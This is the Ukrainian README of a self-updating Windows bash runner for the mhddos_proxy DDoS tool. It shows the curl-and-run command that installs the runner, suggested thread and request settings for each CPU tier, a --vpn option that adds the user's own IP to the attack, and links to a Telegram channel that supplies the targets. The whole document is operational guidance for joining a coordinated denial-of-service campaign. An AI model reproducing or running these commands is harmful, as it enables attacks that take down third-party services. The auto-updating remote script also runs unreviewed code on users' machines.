# Опис runner_for_windows

runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Windows-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) та [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy та proxy_finder  
Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-2 (рандомно) хвилин), щоб дати машині трохи відпочити
Скрипт розподіляє ваші машини по цілям: https://github.com/alexnest-ua/targets/blob/main/targets_linux (цілі беруться звідси: https://t.me/ddos_separ)  
  
[**Варіант для Mac**](https://github.com/alexnest-ua/auto_mhddos_mac)  
[**Варіант для Linux**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/main)  
[**Варіант для Docker**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker)   
[**Варіант для Android**](https://telegra.ph/mhddos-proxy-for-Android-with-Termux-03-31)   
  
  
можете запускати цей скрипт на увесь день та йти по своїм справам - він сам буде брати актуальні цілі (але перед тим ОБОВ'ЯЗКОВО встановіть VPN, який ніколи не відключиться сам: https://auto-ddos.notion.site/Cyberghost-f72074a09b224851b2058d559c0b2691 )  

**якщо запускаєте цей скрипт - інші атаки через Python не запускайте, бо при рестарті він вбиває усі процеси з Python (щоб старі атаки не накопичувалися)**
  
[**Налаштування**](#%D0%BD%D0%B0%D0%BB%D0%B0%D1%88%D1%82%D1%83%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B2%D1%81%D1%82%D0%B0%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F)  
[**Запуск атаки**](#%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8)  
[**Приклади команд з --debug та без**](#%D0%BF%D1%80%D0%B8%D0%BA%D0%BB%D0%B0%D0%B4%D0%B8-%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4-%D0%B7-%D1%80%D1%96%D0%B7%D0%BD%D0%B8%D0%BC%D0%B8-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D0%B0%D0%BC%D0%B8)  



  
Канал, де координуються цілі: https://t.me/ddos_separ (звідти і беруться сюди цілі, тому якщо у вас на Windows запущено цей скрипт - то можете відповчивати, він все зробить за вас)  
чат де ви можете задати свої питання: https://t.me/+8swDHSe_ROI5MmJi  
також можете писати мені в особисті у телеграм, я завжди усім відповідаю: @brainqdead
  
Туторіал по створенню автоматичних та автономних Linux-серверів: https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c  

## Налаштування (встановлення)
  
* щоб скачати на Windows-машину:  
йдемо сюди: https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-komp-03-27  
та пророблюємо 1 та 2 пункт (якщо раніше не зробили)  

після останнього пункту (встановлення Git) відкриваємо Git Bash:  
![image](https://user-images.githubusercontent.com/74729549/163037827-88e246e2-2187-4768-a7a1-4afec1d78e83.png)  
відкриється наступне вікно:  
![image](https://user-images.githubusercontent.com/74729549/163038391-896d66ef-ceeb-42b4-aa92-53b68abb59f1.png)


## Запуск атаки:  
**ПРИ РЕСТАРТІ КОМП'ЮТЕРА / АВТО-СКРИПТА СПЕРШУ ОБОВ'ЯЗКОВО ПОТРІБНО ВІДКРИТИ САМЕ Git Bash і ввести наступну команду, яка саме все завантажить:**
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh
```
* Буде запущено атаку з наступними параметрами за замовчуванням: num_of_copies=1 threads=2000 rpc=1000 debug="" vpn=""(1 список цілей, 2000 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР) та автоматично запустить паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  

Тепер кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  

**Далі можна просто ЗГОРНУТИ вікно і воно буде працювати нескінченно в фоні**  
***щоб зупинити процес - натисніть Ctrl+C (або якщо не спрацює просто закрийте вікно з атакою)***  

**!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 3)), але можно і без них:  
`curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh [num_of_copies] [threads] [rpc] [debug] [vpn]`  
- num_of_copies - кількість атакуємих списків цілей за один прохід (але не менше 1, та не більше 3, бо більше 3-ох знижує ефективність)
- threads - кількість потоків (але не менше 1000, та не більше 2000 для одного ядра, 5000 для 2-4 ядер, 10000 для 4+ ядер)
- rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 3000)
- debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
- vpn - використання вашого ІР у атаці разом з проксі
  
### Приклади команд з різними параметрами:
  
Команди обовязково потрібно вводити в програмі Git Bash  
  
* У всіх варіантах буде автоматично запущено паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
  
1. ***Для лінивих*** (буде обрано за замовчуванням: num_of_copies=1 threads=2000 rpc=1000 debug="" vpn=""(1 список цілей, 2000 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР) та автоматично запустить паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder))
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh
```
  
**CPUs** - це ядра вашого процесора - зазвичай ядер у два рази менше ніж потоків 
  
2. Слаба машина(1 CPU), саме ці параметри за замовчуванням:
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2000 1000
```

3. Середня машина(2-4 CPUs):
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 3500 2000
```

4. Нормальна машина(4-8 CPUs):
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 2 6500 2500
```

5. Потужна машина(9+ CPUs):
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh all 7500 3000
```

  
*також ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ці.*  
*також можете додавати **4-тим** параметром --debug, що слідкувати за ходом атаки, та **5-тим** параметром --vpn, щоб атакувати ще й через свій ІР разом з проксі, наприклад:*  
```shell
curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh 1 2000 1000 --debug --vpn
```
  
* Приклад **БЕЗ** параметру --debug:  
![image](https://user-images.githubusercontent.com/74729549/168058965-1116eb6a-6fc4-45d5-b2a8-eb7f5529ab87.png)  
***наступні 5 хвилин буде виводитись лише інформація від proxy_finder про пошук проксі, але атака теж йде паралельно!***  
* Приклад **З** параметрами --debug та --vpn:  
![image](https://user-images.githubusercontent.com/74729549/168068441-0be60ba6-49c7-41de-a89c-c50410a50fef.png)  
  
  
  
Далі кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  
  
  

* ***щоб зупинити процес - натисніть Ctrl+C (або якщо не спрацює просто закрийте вікно з атакою)***    

УВАГА!!! Скрипт при рестарті (кожні 20 хвилин) вбиває запущені скрипти саме з mhddos_proxy, тому якщо запускаєте цей скрипт на Windows-машині, то свої атаки mhddos_proxy запускайте на [іншій машині](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)


## Список цілей  

  
runner.sh підтримує единий [список цілей](https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux), який можна тримати на github і постійно оновлювати.  
  
  
  
Цілі не обов'язково видаляти із списку. Їх можна просто закоментувати і розкоментувати пізніше, якщо вони знов знадобляться. Скрипт використовує лише строки, які починаються не на #.  
#test1
